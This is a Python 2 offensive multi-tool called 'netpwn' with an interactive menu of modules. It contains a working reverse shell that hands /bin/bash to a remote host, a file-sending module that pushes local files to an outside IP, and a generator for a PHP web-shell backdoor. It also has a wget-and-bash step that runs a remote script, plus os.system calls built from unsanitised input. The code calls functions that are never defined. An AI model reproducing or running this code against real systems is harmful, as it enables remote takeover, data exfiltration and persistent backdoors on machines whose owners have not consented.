#!/usr/bin/python
#Created by 3XPL017
#Member of @togetherwehack
#Install tcpdump, php, aircrack-ng, rkhunter, chkrootkit, iftop and nmap for full functionality
#sudo easy_install netifaces

import os
import sys
import socket
import subprocess
import netifaces
from urllib2 import urlopen
import fcntl
import struct
import base64
from termcolor import colored
import readline

options_sl = ['reverse_shell', 'packet_capture', 'port_scan', 'send_file', 'web_backdoor', 'vpn_server', 'rkhunter', 
    'chkrootkit', 'network_conns', 'hash_check', 'base64', 'fix_rkhunter']

tabcomp = options_sl

def completer(text, state):
    options = [x for x in tabcomp if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def banner():
    print colored ('               __                       ', 'blue')
    print colored ('  ____   _____/  |_________  _  ______  ', 'blue')
    print colored (' /    \_/ __ \   __\____ \ \/ \/ /    \ ', 'blue')
    print colored ('|   |  \  ___/|  | |  |_> >     /   |  \ ', 'blue')
    print colored ('|___|  /\___  >__| |   __/ \/\_/|___|  /', 'blue')
    print colored ('     \/     \/     |__|              \/ ', 'blue')
    print ' '
    print colored('     | Created by 3XPL017         |', 'blue')
    print colored('     | twitter: @3XPL017GH057     |', 'blue')
    print colored('     | https://github.com/3XPL017 |', 'blue')
    print ' '
    print colored('     Type [show modules] to list available modules', 'green')
    print colored('     Type [run <name of module>] to run it', 'green')
    print colored('     Type [show advanced] for more commands', 'green')
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '

def checkRoot():
    if not os.geteuid() == 0:
        sys.exit('netpwn must be run as root')

def reverseShell():
    print colored('Enter the IP to connect to', 'green')
    tgtHost = raw_input(colored('reverse_shell>', 'red'))
    print colored('Enter the port to connect to', 'green')
    tgtPort = int(raw_input(colored('reverse_shell>', 'red')))

    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((tgtHost, tgtPort))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])

    except:
        print colored('Could not connect to host', 'yellow')

def tcpdump():
    print colored('Enter inteface to capture on', 'green')
    interface = raw_input(colored('packet_capture>', 'red'))
    print colored('Outputting to capture.pcap', 'green')
    os.system('tcpdump -i' + interface + ' -w capture.pcap')

def portScan():
    print colored('Enter IP or IP range to scan', 'green')
    target = raw_input(colored('port_scan>', 'red'))
    print colored('Outputting to file portScan.txt', 'green')
    os.system('nmap -sC -sV ' + target + '> portScan.txt')

def sendFile():
    try:
        print colored('Enter the IP to send file to', 'green')
        ip = raw_input(colored('send_file>' 'red'))
        print colored('Enter the port to send file to', 'green')
        port = int(raw_input(colored('send_file>', 'red')))
        print colored('Enter directory of file to send', 'green')
        file = raw_input(colored('send_file>', 'red'))
        f = open(file)
        send = f.read()
        transfer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer.connect((ip, port))
        transfer.send(send)

    except:
        print colored('Could not send file', 'yellow')

def backdoor():
    print colored('Creating php backdoor in your current directory', 'green')
    print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
    code = "<html> <?php system($_GET['cmd']);?> </html>"
    os.system('touch backdoor.php')
    backdoor = open('backdoor.php', 'w')
    backdoor.write(code)
    backdoor.close()

def network():
    print colored('Enter which interface to show current connections of', 'green')
    interface = raw_input(colored('network_conns>', 'red'))
    os.system('iftop -i ' + interface)

def hashCheck():
    print colored('Enter a hash to determine its type', 'green')
    hash = raw_input(colored('hash_check>', 'red'))

    if len(hash) == 32:
        print colored('Hash type: md5', 'green')
    elif len(hash) == 40:
        print colored('Hash type: sha1', 'green')
    elif len(hash) == 64:
        print colored('Hash type: sha256', 'green')
    elif len(hash) == 128:
        print colored('Hash type: sha512', 'green')
    else:
        print colored('No hash type found', 'green')

def base64Con():
    print colored('Enter some text to encode or decode as base64', 'green')
    print colored('This will automatically know if you are trying to encode or decode', 'green')
    print colored('If you are trying to decode and it encodes you did not enter a base64 value', 'green')

    input = raw_input(colored('base64>', 'red'))

    try:
        output = base64.b64decode(input) 
        output.encode('ascii')

    except:
        output = base64.b64encode(input)

    print colored(output, 'green')

def showmac():
    print colored('Enter which interface you would like to get the mac of', 'green')

    try:
        interface = raw_input(colored('mac>', 'red'))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
        print colored(':'.join(['%02x' % ord(char) for char in info[18:24]]), 'green')

    except: 
        print colored('Invalid interface', 'yellow')

def showip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print colored('Your local IP is: ' + (s.getsockname()[0]), 'green')
    s.close()

def showGateway():
    gateway = netifaces.gateways()
    print colored('Your default gateway is: ' + gateway['default'][netifaces.AF_INET][0], 'green')

def showPubIP():
    my_ip = urlopen('http://ip.42.pl/raw').read()
    print colored('Your public IP is: ' + my_ip, 'green')

def modules():
    print colored('reverse_shell', 'green')
    print colored('packet_capture', 'green')
    print colored('port_scan', 'green')
    print colored('send_file', 'green')
    print colored('web_backdoor', 'green')
    print colored('vpn_server', 'green')
    print colored('rkhunter', 'green')
    print colored('chkrootkit', 'green')
    print colored('network_conns', 'green')
    print colored('hash_check', 'green')
    print colored('base64', 'green')

def advanced():
    print colored('[clear] clears the screen', 'green')
    print colored('[show mac] shows your mac address', 'green')
    print colored('[show ip] shows your current local ip', 'green')
    print colored('[show gateway] shows your default gateway', 'green')
    print colored('[show pubip] shows your public ip', 'green')
    print colored('[show firewall] shows current firewall rules', 'green')
    print colored('[fix_rkhunter] use this if rkhunter gives you warnings for everything', 'green')
    print colored('[exit or quit] exits netpwn', 'green')

def main():
    choice = raw_input(colored('netpwn>', 'red'))

    if choice == 'run reverse_shell':
        reverseShell()
    elif choice == 'run packet_capture':
        tcpdump()
    elif choice == 'run port_scan':
        portScan()
    elif choice == 'run send_file':
        sendFile()
    elif choice == 'run web_backdoor':
        backdoor()
    elif choice == 'run vpn_server':
        os.system('wget https://git.io/vpn -O openvpn.sh && bash openvpn.sh')
    elif choice == 'run rkhunter':
        os.system('rkhunter --check')
    elif choice == 'run chkrootkit':
        os.system('chkrootkit')
    elif choice == 'run network_conns':
        network()
    elif choice == 'run hash_check':
        hashCheck()
    elif choice == 'run base64':
        base64Con()
    elif choice == 'show modules':
        modules()
    elif choice == 'show advanced':
        advanced()
    elif choice == 'clear':
        os.system('clear')
    elif choice == 'show mac':
        showmac()
    elif choice == 'show ip':
        showip()
    elif choice == 'show gateway':
        showGateway()
    elif choice == 'show pubip':
        showPubIP()
    elif choice == 'show firewall':
        firewall()
    elif choice == 'fix_rkhunter':
        updateFiles()
    elif choice == '':
        pass
    elif choice == 'banner':
        banner()
    elif choice == 'exit':
        exit(0)
    elif choice == 'quit':
        exit(0)
    else:
        print colored('Not a valid choice', 'yellow')

    main()

if __name__=='__main__':
    checkRoot()
    banner()
    main()